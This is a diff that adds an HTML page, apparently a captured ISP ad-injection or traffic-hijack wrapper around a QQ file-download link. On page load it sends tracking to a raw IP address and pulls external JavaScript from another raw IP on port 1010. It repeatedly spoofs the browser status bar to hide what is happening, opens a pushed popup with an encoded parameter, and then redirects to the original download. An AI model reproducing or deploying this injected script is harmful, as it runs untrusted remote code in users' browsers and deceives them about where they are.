@@ -1,0 +1,15 @@
+  <html><head><meta http-equiv='pragma' content='no-cache'/><meta
+http-equiv='expires' content='-1'/><script>var stat_path='http://125.89.69.20:81/stat.aspx?p=1364123704|6464401|4615|0|0|0';var
+cnt_path='';window.setInterval('window.status=location.href',
+200);</script></head><body scroll='no' style='border:0; margin:0; padding:0;'
+id='mainbody'><iframe src='about:blank' width='100%' height='100%'
+frameborder='0'></iframe><script language='JavaScript' src='http://125.89.69.7:1010/openV4.js'></script>
+<script language='JavaScript'>
+var content='http://gd.189.cn/push/201303/0322/gx5h.htm?p=1364123704|6464401|4615|0|0|0&param=ABioyajZGekprChZeMnc/MzMvJzcrGv87JzNGYm9mPkJOWnIaWm8LLyc7K2Z6Nmp6ckJuawsvLz8vPz9mMkIqNnJqKjZPCl4XRmYuR0Y6O';
+var old_url='http://hz.ftn.qq.com/ftn_handler/97fdeaba0acf69cebc77b45a0beae72659d4f67cb499d0132c4ee626b6231f03df4437428218b826fb7455ec1dd560d771c258e71531622d77c79112dcfaca06?1364123704';
+var param='630|500|9';
+if(checkpop(stat_path))
+{try{OpenWin(content,stat_path,cnt_path,old_url);}catch(e){}}
+else{location.href = old_url;}
+</script>
+</body></html>
